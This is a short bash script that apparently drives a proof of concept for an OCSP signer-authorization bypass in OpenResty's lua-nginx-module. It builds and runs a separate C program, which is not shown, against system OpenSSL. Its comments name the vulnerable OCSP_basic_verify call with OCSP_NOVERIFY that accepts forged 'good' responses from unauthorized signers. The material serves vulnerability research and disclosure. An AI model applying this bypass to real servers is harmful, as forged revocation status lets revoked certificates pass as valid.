#!/usr/bin/env bash
# RestyImposter — OpenResty lua-nginx-module OCSP signer-authorization bypass.
# Builds the PoC against the system OpenSSL (the same libcrypto lua-nginx-module
# links) and drives the REAL OCSP verification: the verbatim vulnerable call
# OCSP_basic_verify(basic, chain, NULL, OCSP_NOVERIFY) accepts a forged "good"
# response signed by an unauthorized cert; the upstream fix rejects it.
# Fully offline (system OpenSSL, no network). Exit 0 on CONFIRMED.
set -u
cd "$(dirname "$0")"

ZIG="${ZIG:-/home/millie/tools/toolchain/zig-linux-x86_64-0.14.0/zig}"
command -v "$ZIG" >/dev/null 2>&1 || ZIG="$(command -v zig || true)"
CC=("$ZIG" cc)
[ -x "$ZIG" ] || { command -v cc >/dev/null 2>&1 && CC=(cc) || { echo "no C compiler"; exit 2; }; }

echo "[*] Building PoC against system OpenSSL ($(openssl version 2>/dev/null)) ..."
"${CC[@]}" -O2 poc.c -lssl -lcrypto -o poc || { echo "build failed"; exit 2; }

./poc
